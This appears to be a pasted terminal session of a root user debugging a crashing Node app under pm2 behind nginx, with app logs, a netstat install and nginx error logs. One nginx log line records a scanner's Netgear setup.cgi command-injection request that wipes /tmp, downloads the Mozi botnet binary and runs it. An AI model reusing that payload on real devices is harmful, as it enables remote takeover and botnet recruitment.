@@ -1,0 +1,111 @@
+
+^C
+root@ubuntu:/var/www/CubaCuba# sudo -u ricoapp pm2 status
+┌────┬────────────────────┬──────────┬──────┬───────────┬──────────┬──────────┐
+│ id │ name               │ mode     │ ↺    │ status    │ cpu      │ memory   │
+├────┼────────────────────┼──────────┼──────┼───────────┼──────────┼──────────┤
+│ 0  │ rico-cuba          │ cluster  │ 15   │ errored   │ 0%       │ 0b       │
+└────┴────────────────────┴──────────┴──────┴───────────┴──────────┴──────────┘
+root@ubuntu:/var/www/CubaCuba# sudo -u ricoapp pm2 logs rico-cuba --lines 50
+[TAILING] Tailing last 50 lines for [rico-cuba] process (change the value with -                                                                                                                                                   -lines option)
+/home/ricoapp/.pm2/logs/rico-cuba-error-0.log last 50 lines:
+/home/ricoapp/.pm2/logs/rico-cuba-out-0.log last 50 lines:
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+0|rico-cub |
+0|rico-cub | > rest-express@1.0.0 start
+0|rico-cub | > NODE_ENV=production node dist/index.js
+0|rico-cub |
+
+^C
+root@ubuntu:/var/www/CubaCuba# netstat -tulpn | grep 3000
+Command 'netstat' not found, but can be installed with:
+apt install net-tools
+root@ubuntu:/var/www/CubaCuba# ^C
+root@ubuntu:/var/www/CubaCuba#
+apt install net-tools
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following NEW packages will be installed:
+  net-tools
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+Need to get 204 kB of archives.
+After this operation, 819 kB of additional disk space will be used.
+Get:1 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 net-tools amd64 1.60+git20181103.0eebece-1ubuntu5.4 [204 kB]
+Fetched 204 kB in 0s (1096 kB/s)
+Selecting previously unselected package net-tools.
+(Reading database ... 102574 files and directories currently installed.)
+Preparing to unpack .../net-tools_1.60+git20181103.0eebece-1ubuntu5.4_amd64.deb ...
+Unpacking net-tools (1.60+git20181103.0eebece-1ubuntu5.4) ...
+Setting up net-tools (1.60+git20181103.0eebece-1ubuntu5.4) ...
+Processing triggers for man-db (2.10.2-1) ...
+Scanning processes...
+Scanning linux images...
+
+Running kernel seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+root@ubuntu:/var/www/CubaCuba# netstat -tulpn | grep 3000
+root@ubuntu:/var/www/CubaCuba# tail -n 50 /var/log/nginx/error.log
+2025/11/06 11:26:33 [notice] 8090#8090: using inherited sockets from "6;7;"
+2025/11/06 11:26:40 [error] 8313#8313: *1 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "217.154.105.67"
+2025/11/06 11:26:40 [error] 8313#8313: *1 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:3000/favicon.ico", host: "217.154.105.67", referrer: "http://217.154.105.67/"
+2025/11/06 11:26:41 [error] 8313#8313: *1 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "217.154.105.67"
+2025/11/06 11:26:41 [error] 8313#8313: *1 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:3000/favicon.ico", host: "217.154.105.67", referrer: "http://217.154.105.67/"
+2025/11/06 11:27:19 [error] 8313#8313: *7 connect() failed (111: Unknown error) while connecting to upstream, client: 120.85.93.105, server: 217.154.105.67, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0", upstream: "http://127.0.0.1:3000/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+2025/11/06 11:38:08 [error] 8313#8313: *10 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "217.154.105.67"
+2025/11/06 11:38:08 [error] 8313#8313: *10 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:3000/favicon.ico", host: "217.154.105.67", referrer: "http://217.154.105.67/"
+2025/11/06 11:38:08 [error] 8313#8313: *10 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET / HTTP/1.1", upstream: "http://127.0.0.1:3000/", host: "217.154.105.67"
+2025/11/06 11:38:09 [error] 8313#8313: *10 connect() failed (111: Unknown error) while connecting to upstream, client: 94.31.69.83, server: 217.154.105.67, request: "GET /favicon.ico HTTP/1.1", upstream: "http://127.0.0.1:3000/favicon.ico", host: "217.154.105.67", referrer: "http://217.154.105.67/"
+root@ubuntu:/var/www/CubaCuba#
